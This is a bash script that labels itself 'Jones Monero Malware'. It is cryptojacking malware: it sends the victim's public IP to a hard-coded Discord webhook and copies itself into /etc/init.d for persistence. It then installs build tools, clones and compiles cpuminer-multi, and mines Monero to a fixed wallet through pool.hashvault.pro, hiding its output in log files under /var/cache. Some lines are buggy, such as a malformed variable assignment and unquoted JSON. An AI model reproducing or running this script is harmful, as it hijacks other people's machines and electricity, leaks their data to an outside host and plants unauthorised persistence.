#!/bin/bash -x

$BEANSTEST=`curl https://api.ipify.org/`
curl --url "https://discord.com/api/webhooks/878607270534070282/SDVWLNm-0-R8mt-j3Nd8L_TH4rCzqnPvtA_dIIjc9xW1gZmofap8tzlbS6JIWMnZoIqc" \
  -H "Content-Type: application/json" \
  -d { "username" : "Jones Monero Malware", "avatar_url" : "https://cdn1.vectorstock.com/i/1000x1000/49/20/funny-brown-monke-y-cartoon-vector-27094920.jpg", "content" : $BEANSTEST }

filename="$0"
cd /var/cache/ && mkdir rndcool
cd
#some balzy error stuff pleas help

BALS=/var/cache/rndcool/
touch /var/cache/rndcool/e.log
touch /var/cache/rndcool/e2.log
touch /var/cache/rndcool/e3.log
touch /var/cache/rndcool/e4.log
touch /var/cache/rndcool/e5.log
touch /var/cache/rndcool/e6.log
touch /var/cache/rndcool/e7.log
touch /var/cache/rndcool/e8.log
touch /var/cache/rndcool/e9.log
touch /var/cache/rndcool/e10.log
touch /var/cache/rndcool/e11.log
touch /var/cache/rndcool/e12.log

# Persistance Mech

mv $filename /etc/init.d/ > /var/cache/rndcool/e10.log 2>&1
chmod +x /etc/init.d/$filename > /var/cache/rndcool/e11.log 2>&1

##################
# Config
pool="pool.hashvault.pro:443"
addr="46z5cQxqzRZ1HBRWRexRh4PhAKUpreKigFHhVGAsJ5aob4y2j8467Af4CuyfDC7pC6afEsLrCEKQFRptxi3z6dBk1vyLt42"
algo="cryptonight"
# End of config
apt-get update && apt-get upgrade -y > /var/cache/rndcool/e.log 2>&1
apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential git nano > /var/cache/rndcool/e2.log 2>&1
apt-get install autoconf pkg-config libgmp-dev zlib1g-dev make g++ > /var/cache/rndcool/e3.log 2>&1
git clone --single-branch -b linux https://github.com/tpruvot/cpuminer-multi > /var/cache/rndcool/e4.log 2>&1
cd cpuminer-multi > /var/cache/rndcool/e5.log 2>&1
chmod +x build.sh > /var/cache/rndcool/e6.log 2>&1
chmod +X autogen.sh > /var/cache/rndcool/e7.log 2>&1
./build.sh || sh build.sh > /var/cache/rndcool/e8.log 2>&1
./cpuminer -a $algo --url $pool -u $addr > /var/cache/rndcool/e9.log 2>&1
